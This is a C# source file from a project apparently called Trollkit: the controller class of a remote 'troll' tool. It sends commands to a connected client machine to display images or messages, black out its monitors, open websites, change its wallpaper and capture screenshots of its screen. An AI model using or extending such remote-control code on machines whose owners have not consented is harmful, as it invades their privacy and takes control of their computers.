﻿using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Controls;
using System.Windows.Input;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using Trollkit_Library.ServerModules;
using static Trollkit_Library.ServerModules.Server;

namespace Trollkit_Library.ViewModels.Commands
{
    public class VisualCommands
    {
		private readonly Server _server;
		private readonly string handler;

		//buttons
		public ICommand DisplayImage { get { return new SendServerCommand(SendDisplayImage); } }
		public ICommand DisplayText { get { return new SendServerCommand(SendDisplayText); } }
		public ICommand TurnOffScreen { get { return new SendServerCommand(SendTurnOffScreen); } }
		public ICommand OpenSite { get { return new SendServerCommand(SendOpenSite); } }
		public ICommand PickBackgroundImage { get { return new SendServerCommand(SendBackgroundImage); } }
		public ICommand MakeScreenshot { get { return new SendServerCommand(SendMakeScreenshot); } }
		public ICommand MaximizeScreenshot { get { return new SendServerCommand(SendMaximizeScreenshot); } }

		//textboxes
		public string BroadcastMessageText { get; set; }
		public string OpenUrlText { get; set; }

		public VisualCommands(Server server, string handler)
		{
			_server = server;
			this.handler = handler;

			BroadcastMessageText = "Berichten Box|Dit is een bericht";
			OpenUrlText = "https://google.com";
		}	

		/// <summary>
		/// Function that sends an image to the client, displays the image and then presses f11 on the client.
		/// </summary>
		private void SendDisplayImage()
		{
			OpenFileDialog open = new OpenFileDialog();
			open.Filter = "Image Files(*.png; *.jpg; *.jpeg; *.gif;)|*.png; *.jpg; *.jpeg; *.gif;";
			open.Multiselect = false;
			open.Title = "Pick an image to send to the client";
			if (open.ShowDialog() == true)
			{
				byte[] bytes = File.ReadAllBytes(open.FileName);

				string base64 = Convert.ToBase64String(bytes);
				TransferCommandObject returnObject = new TransferCommandObject { Command = "ShowImage", Handler = handler, Value = base64 };
				_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
			}
		}

		/// <summary>
		/// Opens a textbox on the client with the provided text
		/// </summary>
		private void SendDisplayText()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "TextBox", Handler = handler, Value = BroadcastMessageText };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		/// <summary>
		/// Turns the client his monitors off
		/// </summary>
		private void SendTurnOffScreen()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "BlackScreen", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		/// <summary>
		/// Opens a website in the default browser
		/// </summary>
		private void SendOpenSite()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "OpenSite", Handler = handler, Value = OpenUrlText };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		/// <summary>
		/// Sends an image to the client and sets this as their wallpaper
		/// </summary>
		private void SendBackgroundImage()
		{
			OpenFileDialog open = new OpenFileDialog();
			open.Filter = "Image Files(*.png; *.jpg; *.jpeg;)|*.png; *.jpg; *.jpeg;";
			open.Multiselect = false;
			open.Title = "Pick an image to set as background in the client";
			if (open.ShowDialog() == true)
			{
				byte[] bytes = File.ReadAllBytes(open.FileName);

				string base64 = Convert.ToBase64String(bytes);

				TransferCommandObject returnObject = new TransferCommandObject { Command = "SetBackground", Handler = handler, Value = base64 };
				_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
			}
		}

		/// <summary>
		/// Sends the screenshot command to the client
		/// </summary>
		private void SendMakeScreenshot()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "MakeScreenshot", Handler = handler, Value = $"{_server.SelectedClient.SelectedScreen.ScreenId}" };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}

		/// <summary>
		/// Tells the host that it should open the screenshot in photoviewer
		/// </summary>
		private void SendMaximizeScreenshot()
		{
			try
			{
				byte[] bytes = Convert.FromBase64String(_server.SelectedClient.Screenshot.ScreenshotData);

				string imagePath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\TrollKit";
				Directory.CreateDirectory(imagePath);
				string fileName = "Screenshot_" + _server.SelectedClient.Screenshot.Timestamp.ToString("dd.MM.yyyy_HH.mm.ss");
				string filePath = imagePath + "\\" + fileName + ".png";
				if (!File.Exists(filePath))
				{
					File.WriteAllBytes(filePath, bytes);
				}

				string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

				ProcessStartInfo psi = new ProcessStartInfo("rundll32.exe",
					String.Format(
						"\"{0}{1}\", ImageView_Fullscreen {2}",
						Environment.Is64BitOperatingSystem ?
							path.Replace(" (x86)", "") :
							path
							,
						@"\Windows Photo Viewer\PhotoViewer.dll",
						filePath)
					);

				psi.UseShellExecute = false;

				Process.Start(psi);
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Visuals Error: " + e.Message, ConsoleColor.Red);
			}
		}
	}
}
